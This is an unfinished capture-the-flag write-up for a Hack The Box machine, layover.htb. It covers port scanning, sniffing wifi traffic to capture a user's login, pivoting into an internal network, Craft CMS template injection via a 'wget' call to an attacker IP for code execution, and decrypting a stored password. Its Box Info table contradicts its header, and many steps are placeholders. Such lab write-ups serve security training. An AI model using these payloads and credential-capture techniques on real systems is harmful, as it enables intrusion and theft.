# layover.htb

> **OS:** Linux\
> **Difficulty:** medium\
> **IP:** `10.10.x.x`\
> **Date:** 03-07-2026

***

### TL;DR

<...>

**Chain:**&#x20;

***

### Box Info

|                |                                                              |
| -------------- | ------------------------------------------------------------ |
| **Name**       | enigma.htb                                                   |
| **OS**         | Linux                                                        |
| **Difficulty** | Easy                                                         |
| **Release**    | Released on 26th September, 2026                             |
| **Key skills** | OPN network, CVE, code execution, CUPS, decrypting passwords |

***

### 1. Recon

#### 1.1 Port scan

```bash
# Nmap 7.99 scan initiated Wed Sep 30 09:43:23 2026 as: /usr/lib/nmap/nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /opt/_NOTES/results/layover/layover.htb/scans/_quick_tcp_nmap.txt -oX /opt/_NOTES/results/layover/layover.htb/scans/xml/_quick_tcp_nmap.xml layover.htb
Nmap scan report for layover.htb (10.129.247.82)
Host is up, received user-set (0.015s latency).
rDNS record for 10.129.247.82: layover
Scanned at 2026-09-30 09:43:23 CEST for 15s
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE       REASON         VERSION
22/tcp   open  ssh           syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
3389/tcp open  ms-wbt-server syn-ack ttl 63 xrdp
```

#### 1.2 Initial observations

* Hostname / domain: layover.htb
*   Added to `/etc/hosts`:<br>

    ```
    10.10.x.x layover.htb
    ```

### 2. Foothold / Initial Access

#### 2.1 Description

>

#### 2.2 Exploitation

Once connected to the layover.htb host as the user via xfreerdp3, connect the wlan2 NIC to the HTB Airport Wi-Fi.

```bash
xfreerdp3 /v:'layover.htb' /u:'contractor' /p:'Contractor2026!' /dynamic-resolution
```

Once wlan2 is connected to the Wi-Fi network, set wlan3 to monitor mode and make sure to capture traffic on channel 6 (2.4 GHz).

```bash
# 1. kill interfering processes
sudo airmon-ng check kill
 
# 2. monitor mode (creates e.g. wlan3mon)
sudo airmon-ng start wlan3
 
# 3. scan for the target - note SSID (OPN=open), BSSID, confirm CH 6
sudo airodump-ng --band bg wlan3mon
 
# 4. tune to channel 6 (2.4 GHz is 20 MHz, no width needed)
sudo iw dev wlan3mon set channel 6
```

After scanning the bg band, wlan3mon shows the HTB International Wi-Fi. Since you are now monitoring channel 6 on wlan3mon, start up Wireshark.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 15.41.58.png" alt=""><figcaption></figcaption></figure>

Once you have Wireshark running, filter for POST requests with `http.request.method == "POST"`. Here you will see the login request from the user jenny.

```
jenny:Fl1ghtDeck2026!
```

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 15.40.27.png" alt=""><figcaption></figcaption></figure>

Log in again with xfreerdp3 and create a pivot to the Wi-Fi network (10.13.37.0/24) utilizing ligolo-ng.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 16.15.44.png" alt=""><figcaption></figcaption></figure>

Once that is done, add the two hosts to your own /etc/hosts file&#x20;

```bash
# HTB /etc/hosts
10.13.37.1 wifi.international.htb
10.13.37.10 portal.international.htb
```

Then, from your Kali host, navigate to `http://portal.international.htb/admin` and log in with the previously captured credentials, which will land you on the dashboard of Craft CMS 5.9.8.

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-01 om 16.34.53.png" alt=""><figcaption></figcaption></figure>

After logging in, navigate to [http://portal.international.htb/admin/content/entries?source=\*](http://portal.international.htb/admin/content/entries?source=*)

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.49.18.png" alt=""><figcaption></figcaption></figure>

Then intercept a request where the filter is being utilized

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.49.42.png" alt=""><figcaption></figcaption></figure>

And in the intercepted request, adjust the `filters` attribute:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.51.08.png" alt=""><figcaption><p>Original request: JSON filters</p></figcaption></figure>

To the following:

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.55.00.png" alt=""><figcaption><p>Adjusted request: Code execution achieved <code>{{[['wget+http://10.13.37.182:8080/test']|filter('system')]}}</code></p></figcaption></figure>

With that, you have an authenticated code execution vulnerability, succesfully exploiting [CVE-2026-31857](https://nvd.nist.gov/vuln/detail/CVE-2026-31857)

***

### 3. Privilege Escalation

#### 3.1 Description

>

```
```



> www-data to aporter

find the .env file > continue to privesc

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-03 om 15.09.41.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.58.37.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 10.59.56.png" alt=""><figcaption></figcaption></figure>

<...>

```php
<?php

require '/var/www/portal/vendor/autoload.php';
require '/var/www/portal/vendor/craftcms/cms/bootstrap/console.php';

$password = Craft::$app->getSecurity()->decryptByKey(base64_decode("u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w="), "IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr");
echo $password;

?>
```

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 11.02.37.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-04 om 11.03.09.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-03 om 17.14.54.png" alt=""><figcaption></figcaption></figure>

<...>

<figure><img src="../../.gitbook/assets/Scherm­afbeelding 2026-10-08 om 15.38.12.png" alt=""><figcaption></figcaption></figure>

<...>
